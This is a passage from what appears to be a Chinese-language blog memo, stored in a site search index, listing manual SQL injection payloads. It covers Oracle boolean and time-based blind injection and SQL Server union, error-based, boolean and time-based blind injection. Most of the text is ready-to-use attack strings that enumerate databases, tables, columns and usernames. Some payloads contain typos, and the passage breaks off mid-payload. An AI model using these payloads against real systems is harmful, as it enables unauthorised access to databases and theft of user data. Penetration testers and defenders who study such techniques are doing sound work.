RETURN(返回值n)<br>ELSE<br>　　　　RETURN(缺省值)<br>END IF<br>?id&#x3D;1’ and 1&#x3D;(select decode(user,’SYSTEM’,1,0,0) from dual)–<br>?id&#x3D;1’ and 1&#x3D;(select decode(substr(user,1,1),’S’,1,0,0) from dual)–<br>?id&#x3D;1’ and ascii(substr(user,1,1))&gt; 64–  #二分法</p><h4 id="2-3-2-时间盲注"><a href="#2-3-2-时间盲注" class="headerlink" title="2.3.2 时间盲注"></a>2.3.2 时间盲注</h4><p>可使用DBMS_PIPE.RECEIVE_MESSAGE(‘任意值’,延迟时间)函数进行时间盲注，这个函数可以指定延迟的时间</p><p><code>?id=1&#39; and 1=(case when ascii(substr(user,1,1))&gt; 128 then DBMS_PIPE.RECEIVE_MESSAGE(&#39;a&#39;,5) else 1 end)--</code><br><code>?id=1&#39; and 1=(case when ascii(substr(user,1,1))&gt; 64 then DBMS_PIPE.RECEIVE_MESSAGE(&#39;a&#39;,5) else 1 end)--</code></p><h2 id="0x03-SQL-server-手工注入"><a href="#0x03-SQL-server-手工注入" class="headerlink" title="0x03 SQL server 手工注入"></a>0x03 SQL server 手工注入</h2><h3 id="3-1-联合注入"><a href="#3-1-联合注入" class="headerlink" title="3.1 联合注入"></a>3.1 联合注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select null,null--</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> @<span class="hljs-variable">@servername</span>, @<span class="hljs-variable">@version</span><span class="hljs-comment">--</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select db_name(),suser_sname()--</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> sys.databases <span class="hljs-keyword">where</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">6</span> name <span class="hljs-keyword">from</span> sys.databases)),<span class="hljs-keyword">null</span><span class="hljs-comment">--</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select (select top 1 name from sys.databases where name not in (select top 7 name from sys.databasesl),null--</span><br><span class="hljs-string">?id--1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> table_ name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">0</span> table_name <span class="hljs-keyword">from</span> information_schema.tables)),<span class="hljs-keyword">null</span><span class="hljs-comment">--</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select (select top 1 column name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#x27;</span>users<span class="hljs-string">&#x27;)),null---</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">3</span> username <span class="hljs-keyword">from</span> users)),<span class="hljs-keyword">null</span><span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h3 id="3-2-报错注入"><a href="#3-2-报错注入" class="headerlink" title="3.2 报错注入"></a>3.2 报错注入</h3><p><code>?id=1&#39; and 1=(select 1/@@servername)--</code><br><code>?id=1&#39; and 1=(select 1/(select top 1 name from sys.databases where name not in (select top 1 name from sys.databases))--</code></p><h3 id="3-3-盲注"><a href="#3-3-盲注" class="headerlink" title="3.3 盲注"></a>3.3 盲注</h3><h4 id="3-3-1-布尔盲注"><a href="#3-3-1-布尔盲注" class="headerlink" title="3.3.1 布尔盲注"></a>3.3.1 布尔盲注</h4><p><code>?id=1&#39; and ascii(substring((select db_ name(1)),1,1))&gt; 64--</code></p><h4 id="3-3-2-时间盲注"><a href="#3-3-2-时间盲注" class="headerlink" title="3.3.2 时间盲注"></a>3.3.2 时间盲注</h4><p><code>?id= 1&#39;;if(2&gt;1) waitfor delay &#39;0:0:5&#39;--</code><br><code>?id= 1&#39;;if(ASCII(SUBSTRING((select db_name(1)),1,1))&gt; 64) wai</code></p>]]></content>
    
    
    <categories>
      
      <category>sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>备忘录</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
